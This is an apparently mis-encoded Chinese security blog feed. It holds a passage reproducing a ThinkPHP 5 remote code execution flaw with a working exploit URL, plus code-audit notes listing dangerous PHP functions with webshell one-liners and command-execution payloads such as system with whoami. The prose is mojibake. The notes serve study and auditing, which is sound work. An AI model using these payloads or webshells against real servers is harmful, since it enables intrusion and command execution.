<p>å¯ä»¥å‘ç°ï¼Œå½“ <code>$name</code> ä»¥åæ–œçº¿ <code>\</code> å¼€å§‹æ—¶ç›´æ¥å°†å…¶ä½œä¸ºç±»åã€‚åˆ©ç”¨å‘½åç©ºé—´çš„ç‰¹ç‚¹ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶æ­¤å¤„çš„ <code>$name</code>ï¼ˆå³è·¯ç”±ä¸­çš„ <code>controller</code> éƒ¨åˆ†ï¼‰ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®ä¾‹åŒ–ä»»ä½•ä¸€ä¸ªç±»ã€‚</p>
<p>ä½†æ˜¯è¦ä¼ å‚è¿›å»ï¼Œå°±è¦çœ‹tpçš„urlè§£æé…ç½®ï¼Œ</p>
<p> <code>route/Rule.php</code>ä¸­é…ç½®äº†å¦‚ä½•è§£æä¸­çš„è·¯ç”±ä¿¡æ¯ï¼Œ</p>
<p><img src="/post/CMS-Test/image-20231009173923949.png" alt="image-20231009173923949"></p>
<p>å°±æ˜¯ç”¨<code>/</code>å°†$urlåˆ†å‰²å¼€ï¼Œ</p>
<p>è€Œ$urlæ˜¯ä»<code>Request::path()</code>ä¸­è·å–ï¼Œé‚£ç›´æ¥ä¿®æ”¹è¯·æ±‚urlå³å¯ï¼Œé‚£å°±æœ‰æ€è·¯äº†ã€‚</p>
<p>åªæ˜¯$urlè¿™ä¸ªå‚æ•°æ˜¯å¦‚ä½•è·å–çš„å‘¢ï¼Ÿ</p>
<p>åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œ<code>pathinfo()</code>ä¼šè¿›è¡Œè¯»å–è¯·æ±‚ä¸­çš„<code>GET</code>å‚æ•°<code>$this*-&gt;config[&#39;var_pathinfo&#39;]</code></p>
<p><img src="/post/CMS-Test/image-20231009175218331.png" alt="image-20231009175218331"></p>
<p>è€Œ <code>var_pathinfo</code> çš„é»˜è®¤é…ç½®ä¸º <code>s</code>ï¼Œäºæ˜¯åªéœ€è¦ä¼ å…¥å‚æ•°<code>s</code>ï¼Œå¯¹å…¶è¿›è¡Œä¿®æ”¹å³å¯ï¼Œå³å¯è¾¾åˆ°ä¼ å‚ä¿®æ”¹çš„ç›®çš„</p>
<p><img src="/post/CMS-Test/image-20231009174731186.png" alt="image-20231009174731186"></p>
<h2 id="æ¼æ´æ„é€ payloadä»¥åŠå¤ç°"><a href="#æ¼æ´æ„é€ payloadä»¥åŠå¤ç°" class="headerlink" title="æ¼æ´æ„é€ payloadä»¥åŠå¤ç°"></a>æ¼æ´æ„é€ payloadä»¥åŠå¤ç°</h2><p>æ ¹æ®ä¸Šé¢ä»£ç åˆ†æï¼Œå®é™…ä¸Šå°±æ˜¯å®ä¾‹åŒ–ç±»ï¼Œå¦‚ä½•è°ƒç”¨å°±è¡Œäº†</p>
<p>äºæ˜¯éšä¾¿æ‰¾ä¸ªæœ‰æ‰§è¡Œå‡½æ•°æˆ–è€…æ¶æ„å‡½æ•°ç±»å®ä¾‹åŒ–å³å¯ï¼Œè®°å¾—åŠ ä¸Šåæ–œçº¿ <code>\</code> ï¼Œè®©å…¶nameè¢«ä»£ç è®¤ä¸ºæ˜¯ç±»è¿›è¡Œå®ä¾‹åŒ–å³å¯</p>
<p>åº•ä¸‹æˆ‘å°±ç”¨å®ä¾‹åŒ–<code>app</code>ä¸­çš„<code>invokefunction</code>è°ƒç”¨<code>call_user_func_array</code>ï¼Œç”¨<code>system</code>å‡½æ•°æ‰§è¡Œ<code>dir</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/tp5/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/CMS-Test/image-20231009175604641.png" alt="image-20231009175604641"></p>
<p>æµ‹è¯•å®Œæˆ</p>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>æ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»£ç å®¡è®¡çŸ¥è¯†ç‚¹è®°å½•</title>
    <url>//post/Code-audit/</url>
    <content><![CDATA[<p><code>ä»£ç å®¡è®¡å­¦ä¹ çš„ä¸€äº›ç¬”è®°</code></p>
<span id="more"></span>

<h1 id="ä»£ç å®¡è®¡-å¸¸è§phpå¨èƒå‡½æ•°ï¼ˆä¸Šï¼‰"><a href="#ä»£ç å®¡è®¡-å¸¸è§phpå¨èƒå‡½æ•°ï¼ˆä¸Šï¼‰" class="headerlink" title="ä»£ç å®¡è®¡-å¸¸è§phpå¨èƒå‡½æ•°ï¼ˆä¸Šï¼‰"></a>ä»£ç å®¡è®¡-å¸¸è§phpå¨èƒå‡½æ•°ï¼ˆä¸Šï¼‰</h1><blockquote>
<p>æ–‡ç« æ¥è‡ª<a href="https://baijiahao.baidu.com/s?id=1715285716686081123&wfr=spider&for=pc">æˆéƒ½çŸ¥é“åˆ›å®‡</a></p>
</blockquote>
<h2 id="1-å¸¸è§phpå›è°ƒå‡½æ•°ï¼Œå¯è°ƒç”¨å…¶ä»–å‘½ä»¤-ä»£ç æ‰§è¡Œå‡½æ•°"><a href="#1-å¸¸è§phpå›è°ƒå‡½æ•°ï¼Œå¯è°ƒç”¨å…¶ä»–å‘½ä»¤-ä»£ç æ‰§è¡Œå‡½æ•°" class="headerlink" title="1.å¸¸è§phpå›è°ƒå‡½æ•°ï¼Œå¯è°ƒç”¨å…¶ä»–å‘½ä»¤&#x2F;ä»£ç æ‰§è¡Œå‡½æ•°"></a>1.å¸¸è§phpå›è°ƒå‡½æ•°ï¼Œå¯è°ƒç”¨å…¶ä»–å‘½ä»¤&#x2F;ä»£ç æ‰§è¡Œå‡½æ•°</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">call_user_func</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">call_user_func_array</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">create_function</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">array_walk</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">array_map</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">array_filter</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">usort</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">ob_start</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line">å¯å˜å‡½æ•°$_GET<span class="selector-attr">[<span class="string">&#x27;a&#x27;</span>]</span>($_GET<span class="selector-attr">[<span class="string">&#x27;b&#x27;</span>]</span>)</span><br></pre></td></tr></table></figure>



<h2 id="2-å¸¸è§phpå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š"><a href="#2-å¸¸è§phpå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š" class="headerlink" title="2.å¸¸è§phpå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š"></a>2.å¸¸è§phpå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š</h2><p>system()ã€passthru()ã€exec()ã€shell_exec()ã€ pcntl_exec()ã€popen()ã€proc_open()</p>
<h2 id="3-å¸¸è§phpå¯ä»£ç æ‰§è¡Œçš„å‡½æ•°ï¼š"><a href="#3-å¸¸è§phpå¯ä»£ç æ‰§è¡Œçš„å‡½æ•°ï¼š" class="headerlink" title="3.å¸¸è§phpå¯ä»£ç æ‰§è¡Œçš„å‡½æ•°ï¼š"></a>3.å¸¸è§phpå¯ä»£ç æ‰§è¡Œçš„å‡½æ•°ï¼š</h2><p>eval()ã€assert()ã€preg_replace()ã€$</p>
<h2 id="4-ç¦ç”¨å±é™©å‡½æ•°ï¼š"><a href="#4-ç¦ç”¨å±é™©å‡½æ•°ï¼š" class="headerlink" title="4.ç¦ç”¨å±é™©å‡½æ•°ï¼š"></a>4.ç¦ç”¨å±é™©å‡½æ•°ï¼š</h2><p>phpé…ç½®æ–‡ä»¶php.inié‡Œæœ‰ä¸ªdisable_functions &#x3D; é…ç½®é€‰é¡¹ï¼Œå¯è‡ªå®šä¹‰ç¦ç”¨æŸäº›phpå±é™©å‡½æ•°.å¦‚:disable_functions &#x3D;system,passthru,shell_exec,exec,popen</p>
<h2 id="ä¸€ã€å¯æ‰§è¡Œphpä»£ç çš„å‡½æ•°"><a href="#ä¸€ã€å¯æ‰§è¡Œphpä»£ç çš„å‡½æ•°" class="headerlink" title="ä¸€ã€å¯æ‰§è¡Œphpä»£ç çš„å‡½æ•°"></a>ä¸€ã€å¯æ‰§è¡Œphpä»£ç çš„å‡½æ•°</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="title function_ invoke__">assert</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>php 7.1.7 ï¼Œå·²ç»æ— æ³•ç”¨call_user_funcå›è°ƒè°ƒç”¨ test.php?cmd&#x3D;phpinfo(); preg_replace()  5.6ä»¥ä¸‹å¯ä»¥æ‰§è¡Œ 5.6ä»¥ä¸Šä»ç„¶å¯ä»¥æ‰§è¡Œï¼Œä½†æ˜¯ä¼šæœ‰è­¦å‘Š PHP7åå·²ç»ä¸æ”¯æŒ&#x2F;eä¿®é¥°ç¬¦  preg_replace(â€œ&#x2F;test&#x2F;eâ€,$_GET[â€œhâ€],â€jutst testâ€); &#x2F;&#x2F;å°†jutst  testä»¥&#x2F;testæ­£åˆ™åŒ¹é…ä»¥hæ¥æ›¿æ¢ &#x2F;e ä¿®æ­£ç¬¦ä½¿ preg_replace() å°† replacement å‚æ•°å½“ä½œ PHP ä»£ç   ?h&#x3D;phpinfo() ${phpinfo()}</p>
<h2 id="äºŒã€å¸¸è§phpå›è°ƒå‡½æ•°ï¼Œå¯è°ƒç”¨å…¶ä»–å‘½ä»¤-ä»£ç æ‰§è¡Œå‡½æ•°ï¼š"><a href="#äºŒã€å¸¸è§phpå›è°ƒå‡½æ•°ï¼Œå¯è°ƒç”¨å…¶ä»–å‘½ä»¤-ä»£ç æ‰§è¡Œå‡½æ•°ï¼š" class="headerlink" title="äºŒã€å¸¸è§phpå›è°ƒå‡½æ•°ï¼Œå¯è°ƒç”¨å…¶ä»–å‘½ä»¤&#x2F;ä»£ç æ‰§è¡Œå‡½æ•°ï¼š"></a>äºŒã€å¸¸è§phpå›è°ƒå‡½æ•°ï¼Œå¯è°ƒç”¨å…¶ä»–å‘½ä»¤&#x2F;ä»£ç æ‰§è¡Œå‡½æ•°ï¼š</h2><h3 id="1-call-user-func"><a href="#1-call-user-func" class="headerlink" title="1) call_user_func()"></a>1) call_user_func()</h3><p><code>call_user_func</code> â€” æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨, å…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°</p>
<h4 id="å›è°ƒå‡½æ•°"><a href="#å›è°ƒå‡½æ•°" class="headerlink" title="å›è°ƒå‡½æ•°"></a>å›è°ƒå‡½æ•°</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a1&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;a2&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a1=system&amp;a2=whoami  //å‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">//xxx.php?a1=assert&amp;a2=phpinfo()   //ä»£ç æ‰§è¡Œ </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="è°ƒç”¨ç±»ä¸­çš„å‡½æ•°"><a href="#è°ƒç”¨ç±»ä¸­çš„å‡½æ•°" class="headerlink" title="è°ƒç”¨ç±»ä¸­çš„å‡½æ•°"></a>è°ƒç”¨ç±»ä¸­çš„å‡½æ•°</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure>



<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line"><span class="title">phpä¸­ -&gt;ä¸::</span> è°ƒç”¨ç±»ä¸­çš„æˆå‘˜çš„åŒºåˆ«</span><br><span class="line"></span><br><span class="line"> -&gt;ç”¨äºåŠ¨æ€è¯­å¢ƒå¤„ç†æŸä¸ªç±»çš„æŸä¸ªå®ä¾‹</span><br><span class="line"> </span><br><span class="line"><span class="title"> ::</span>å¯ä»¥è°ƒç”¨ä¸€ä¸ªé™æ€çš„ã€ä¸ä¾èµ–äºå…¶ä»–åˆå§‹åŒ–çš„ç±»æ–¹æ³•.</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥è¿™é‡Œ<code>payload</code>ä¸º</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">ctfshow</span>=ctfshow::getFlag</span><br></pre></td></tr></table></figure>

<h4 id="è°ƒç”¨ç±»ä¸­çš„å‡½æ•°ã€æ•°ç»„ã€‘"><a href="#è°ƒç”¨ç±»ä¸­çš„å‡½æ•°ã€æ•°ç»„ã€‘" class="headerlink" title="è°ƒç”¨ç±»ä¸­çš„å‡½æ•°ã€æ•°ç»„ã€‘"></a>è°ƒç”¨ç±»ä¸­çš„å‡½æ•°ã€æ•°ç»„ã€‘</h4><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">call_user_func()å‚æ•°ä¸ä»…å¯ä»¥æ˜¯å­—ç¬¦ä¸²ï¼Œè¿˜æœ‰ æ•°ç»„å½¢å¼ï¼</span><br><span class="line"></span><br><span class="line">call_user_func(<span class="built_in">array</span>(<span class="symbol">$class</span>name, <span class="string">&#x27;say_hello&#x27;</span>));</span><br><span class="line">è°ƒç”¨classnameè¿™ä¸ªç±»é‡Œçš„sya_helloæ–¹æ³•</span><br><span class="line"></span><br><span class="line"><span class="built_in">array</span>[<span class="number">0</span>]=<span class="symbol">$class</span>name  ç±»å</span><br><span class="line"><span class="built_in">array</span>[<span class="number">1</span>]=say_hello   say_hello()æ–¹æ³•</span><br></pre></td></tr></table></figure>



<pre><code>æŒ‰ç…§ä¸Šè¿°æ ¼å¼å¾—åˆ°payloadï¼š

ctfshow[]=ctfshow&amp;ctfshow[]=getFlag   #POST
</code></pre>
<h3 id="2-call-user-func-array"><a href="#2-call-user-func-array" class="headerlink" title="2)call_user_func_array()"></a>2)call_user_func_array()</h3><p>call_user_func_array()æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°ï¼ˆcallbackï¼‰è°ƒç”¨ï¼ŒæŠŠå‚æ•°æ•°ç»„ä½œï¼ˆparam_arrï¼‰ä¸ºå›è°ƒå‡½æ•°çš„çš„å‚æ•°ä¼ å…¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a1&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;a2&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a1=system&amp;a2[]=whoami</span></span><br><span class="line"><span class="comment">//xxx.php?a1=assert&amp;a2[]=phpinfo()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-create-function"><a href="#3-create-function" class="headerlink" title="3)create_function()"></a>3)create_function()</h3><p>åˆ›å»ºåŒ¿åå‡½æ•°ï¼ˆAnonymous functionsï¼‰ï¼Œå…è®¸ ä¸´æ—¶åˆ›å»ºä¸€ä¸ªæ²¡æœ‰æŒ‡å®šåç§°çš„å‡½æ•°ã€‚æœ€ç»å¸¸ç”¨ä½œå›è°ƒå‡½æ•°ï¼ˆcallbackï¼‰å‚æ•°çš„å€¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="variable">$b</span>();</span><br><span class="line"><span class="comment">//xxx.php?a=phpinfo();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="4-array-walk"><a href="#4-array-walk" class="headerlink" title="4) array_walk()"></a>4) array_walk()</h3><p>array_walk â€” ä½¿ç”¨ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°å¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ åšå›è°ƒå¤„ç†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">array_walk</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a[]=phpinfo()&amp;b=assert</span></span><br><span class="line"><span class="comment">//xxx.php?a[]=whoami&amp;b=system</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="5-array-map"><a href="#5-array-map" class="headerlink" title="5)array_map()"></a>5)array_map()</h3><p>array_map()ä¸ºæ•°ç»„çš„æ¯ä¸ªå…ƒç´ åº”ç”¨å›è°ƒå‡½æ•°ã€‚è¿”å›æ•°ç»„ï¼Œæ˜¯ä¸º array1 æ¯ä¸ªå…ƒç´ åº”ç”¨ callbackå‡½æ•°ä¹‹åçš„æ•°ç»„ã€‚callback å‡½æ•°å½¢å‚çš„æ•°é‡å’Œä¼ ç»™ array_map() æ•°ç»„æ•°é‡ï¼Œä¸¤è€…å¿…é¡»ä¸€æ ·ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a=system&amp;b[]=whoami</span></span><br><span class="line"><span class="comment">//xxx.php?a=assert&amp;b[]=phpinfo()</span></span><br><span class="line"><span class="comment">//$array = array(0,1,2,3,4,5);</span></span><br><span class="line"><span class="comment">//array_map($_GET[&#x27;a&#x27;],$array);</span></span><br><span class="line"><span class="comment">//.php?a=phpinfo </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="6-array-filter"><a href="#6-array-filter" class="headerlink" title="6) array_filter()"></a>6) array_filter()</h3><p>array_filter()ç”¨å›è°ƒå‡½æ•°è¿‡æ»¤æ•°ç»„ä¸­çš„å•å…ƒã€‚ä¾æ¬¡å°† array æ•°ç»„ä¸­çš„æ¯ä¸ªå€¼ä¼ é€’åˆ° callback å‡½æ•°ã€‚å¦‚æœ callback å‡½æ•°è¿”å› trueï¼Œ åˆ™ array æ•°ç»„çš„å½“å‰å€¼ä¼šè¢«åŒ…å«åœ¨è¿”å›çš„ç»“æœæ•°ç»„ä¸­ã€‚æ•°ç»„çš„é”®åä¿ç•™ä¸å˜ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]),<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>]);</span><br><span class="line"><span class="comment">//?func=system&amp;cmd=whoami</span></span><br><span class="line"><span class="comment">//?func=assert&amp;cmd=phpinfo() </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="7-å¯å˜å‡½æ•°-var-args"><a href="#7-å¯å˜å‡½æ•°-var-args" class="headerlink" title="7) å¯å˜å‡½æ•°$var(args)"></a>7) å¯å˜å‡½æ•°$var(args)</h3><p>PHP æ”¯æŒå¯å˜å‡½æ•°çš„æ¦‚å¿µã€‚å¦‚æœä¸€ä¸ªå˜é‡ååæœ‰åœ†æ‹¬å·ï¼ŒPHP å°†å¯»æ‰¾ä¸å˜é‡çš„å€¼åŒåçš„å‡½æ•°ï¼Œ å¹¶ä¸”å°è¯•æ‰§è¡Œå®ƒã€‚å¯å˜å‡½æ•°å¯ä»¥ç”¨æ¥å®ç°åŒ…æ‹¬å›è°ƒå‡½æ•°ï¼Œå‡½æ•°è¡¨åœ¨å†…çš„ä¸€äº›ç”¨é€”ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a=system&amp;b=whoami</span></span><br><span class="line"><span class="comment">//xxx?a=assert&amp;b=phpinfo()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="8-usort"><a href="#8-usort" class="headerlink" title="8) usort()"></a>8) usort()</h3><p>æœ¬å‡½æ•°å°†ç”¨ç”¨æˆ·è‡ªå®šä¹‰çš„æ¯”è¾ƒå‡½æ•°å¯¹ä¸€ä¸ªæ•°ç»„ä¸­çš„å€¼è¿›è¡Œæ’åº php5.6ä¹‹å‰å¯ä»¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">usort</span>(...<span class="variable">$_GET</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">payload: <span class="number">1</span>.php?<span class="number">1</span>[<span class="number">0</span>]=<span class="number">0</span>&amp;<span class="number">1</span>[<span class="number">1</span>]=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])&amp;<span class="number">2</span>=assert POSTä¼ å‚: x=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>

<h3 id="9ï¼‰uasort"><a href="#9ï¼‰uasort" class="headerlink" title="9ï¼‰uasort"></a>9ï¼‰uasort</h3><p>php5.6 php7ä¸å¯ä»¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$onearray</span> = <span class="keyword">array</span>(<span class="string">&#x27;Ameng&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">uasort</span>(<span class="variable">$onearray</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">payload: <span class="number">1</span>.php?a=assert POSTä¼ å‚: x=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>

<h3 id="10ï¼‰ob-start"><a href="#10ï¼‰ob-start" class="headerlink" title="10ï¼‰ob_start"></a>10ï¼‰ob_start</h3><p>ob_start â€” æ‰“å¼€è¾“å‡ºæ§åˆ¶ç¼“å†²</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$foobar</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="variable">$foobar</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;h&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">/test.php?h=whoami&amp;b=system</span><br></pre></td></tr></table></figure>

<h2 id="ä¸‰ã€å¸¸è§phpå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š"><a href="#ä¸‰ã€å¸¸è§phpå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š" class="headerlink" title="ä¸‰ã€å¸¸è§phpå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š"></a>ä¸‰ã€å¸¸è§phpå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š</h2><h3 id="1-system"><a href="#1-system" class="headerlink" title="1) system()"></a>1) system()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="comment">//xxx.php?a=whoami ?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-passthru"><a href="#2-passthru" class="headerlink" title="2) passthru()"></a>2) passthru()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">passthru</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="comment">//xxx.php?a=whoami ?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-exec"><a href="#3-exec" class="headerlink" title="3) exec()"></a>3) exec()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//xxx.php?a=whoami </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="4-shell-exec"><a href="#4-shell-exec" class="headerlink" title="4) shell_exec()"></a>4) shell_exec()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//xxx.php?a=whoami </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="5-pcntl-exec"><a href="#5-pcntl-exec" class="headerlink" title="5) pcntl_exec()"></a>5) pcntl_exec()</h3><p>è¦æ±‚ï¼šlinuxç³»ç»Ÿç‰¹æœ‰æ¨¡å—ï¼Œéœ€ç¼–è¯‘é€‰é¡¹ä¸­å­˜åœ¨â€”enable-pcntl</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">pcntl_exec</span>( <span class="string">&quot;/bin/bash&quot;</span> , <span class="keyword">array</span>(<span class="string">&quot;whoami&quot;</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="6-popen"><a href="#6-popen" class="headerlink" title="6) popen()"></a>6) popen()</h3><p>popen â€” æ‰“å¼€è¿›ç¨‹æ–‡ä»¶æŒ‡é’ˆã€‚æ‰“å¼€ä¸€ä¸ªæŒ‡å‘è¿›ç¨‹çš„ç®¡é“ï¼Œè¯¥è¿›ç¨‹ç”±æ´¾ç”Ÿç»™å®šçš„ command å‘½ä»¤æ‰§è¡Œè€Œäº§ç”Ÿ</p>
